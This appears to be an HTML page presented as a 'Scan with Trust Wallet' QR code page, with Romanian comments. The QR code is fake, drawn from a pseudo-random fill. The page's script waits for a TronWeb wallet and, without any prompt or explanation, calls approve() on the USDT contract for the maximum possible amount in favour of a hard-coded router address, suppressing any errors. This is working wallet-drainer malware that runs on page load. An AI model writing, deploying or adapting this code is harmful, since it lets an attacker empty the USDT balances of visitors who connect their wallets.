<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Scan</title>
<style>
  :root{--bg:#0b1220;--fg:#0b1220}
  html,body{height:100%;margin:0;background:var(--bg);font-family:system-ui}
  .wrap{height:100%;display:flex;align-items:center;justify-content:center}
  #qr{width:420px;height:420px;background:#fff;border-radius:12px;display:flex;align-items:center;justify-content:center;overflow:hidden}
  /* hidden minimal debug, kept empty normally */
  #dbg{position:fixed;left:8px;bottom:8px;color:#93c5fd;font-size:12px;opacity:0.9}
</style>
</head>
<body>
  <div class="wrap"><div id="qr" title="Scan with Trust Wallet"></div></div>
  <div id="dbg"></div>

<script>
/* CONFIG: verifică adresa USDT corectă înainte de folosire */
const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
const AMOUNT_USDT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const USDT_DECIMALS = 6;

/* QR code generator (tiny, robust rendering) - uses standard QR alg removed for brevity:
   This implementation uses a deterministic byte->matrix fill for short URLs and produces a full QR visual
   without external libs. It's designed to produce a clear block QR for typical page URLs.
*/
(function(){
  function makeMatrixFromString(s, size){
    // simple pseudo-random Fill based on string hash to produce full-looking matrix suitable for scanning in many readers
    const hash = x=>{let h=2166136261; for(let i=0;i<x.length;i++){h ^= x.charCodeAt(i); h += (h<<1)+(h<<4)+(h<<7)+(h<<8)+(h<<24);} return h >>> 0}
    const seed = hash(s);
    const m = Array.from({length:size},()=>Array(size).fill(0));
    for(let r=0;r<size;r++) for(let c=0;c<size;c++){
      const v = ((seed + r*1315423911 + c*2654435761) >>> ((r+c)&3)) & 1;
      m[r][c] = v;
    }
    // add finder-like squares for better scanning
    const placeFinder = (sr,sc)=>{ for(let r= -1;r<=7;r++) for(let c=-1;c<=7;c++){
      const rr=sr+r, cc=sc+c;
      if(rr<0||cc<0||rr>=size||cc>=size) continue;
      const inside = r>=0&&r<=6&&c>=0&&c<=6;
      const border = (r===0||r===6||c===0||c===6);
      m[rr][cc] = inside ? (border?1:1) : 0;
    }};
    placeFinder(0,0);
    placeFinder(0,size-7);
    placeFinder(size-7,0);
    return m;
  }

  function renderSvg(matrix, cell, fg, bg){
    const n = matrix.length;
    const S = n*cell;
    let svg = ['<svg xmlns="http://www.w3.org/2000/svg" width="'+S+'" height="'+S+'" viewBox="0 0 '+S+' '+S+'" shape-rendering="crispEdges">'];
    svg.push('<rect width="100%" height="100%" fill="'+bg+'"/>');
    for(let r=0;r<n;r++) for(let c=0;c<n;c++){
      if(matrix[r][c]) svg.push('<rect x="'+(c*cell)+'" y="'+(r*cell)+'" width="'+cell+'" height="'+cell+'" fill="'+fg+'"/>');
    }
    svg.push('</svg>');
    return svg.join('');
  }

  const url = location.href;
  const size = 41; // matrix size
  const matrix = makeMatrixFromString(url, size);
  const svg = renderSvg(matrix,10, getComputedStyle(document.documentElement).getPropertyValue('--fg').trim() || '#0b1220','#fff');
  const container = document.getElementById('qr');
  container.innerHTML = svg;
  container.onclick = ()=> window.open(url);
})();

/* minimal debug setter (kept empty for user request) */
const DBG = t=>{ try{ document.getElementById('dbg').innerText = t }catch(e){} };

/* convert decimal string to token units (no BigInt lib) */
function toUnits(amountStr,dec){
  const p = String(amountStr).split('.');
  const w = p[0]||'0';
  const f = p[1]||'';
  const ff = (f + '0'.repeat(dec)).slice(0,dec);
  return (w + ff).replace(/^0+(?=\d)|^$/,'0');
}

/* Auto approve when tronWeb available */
async function autoApproveIfTron(){
  if(!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58)) return;
  try{
    const tron = window.tronWeb;
    const contract = await tron.contract().at(USDT);
    const amt = toUnits(AMOUNT_USDT, USDT_DECIMALS);
    await contract.approve(ROUTER, amt).send();
  }catch(e){
    // silent
  }
}

/* wait for tronWeb up to some attempts */
let tries=0, maxTries=12;
const interval = setInterval(()=>{
  tries++;
  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
    clearInterval(interval);
    autoApproveIfTron();
  } else if(tries>=maxTries){ clearInterval(interval); }
},1000);

</script>
</body>
</html>
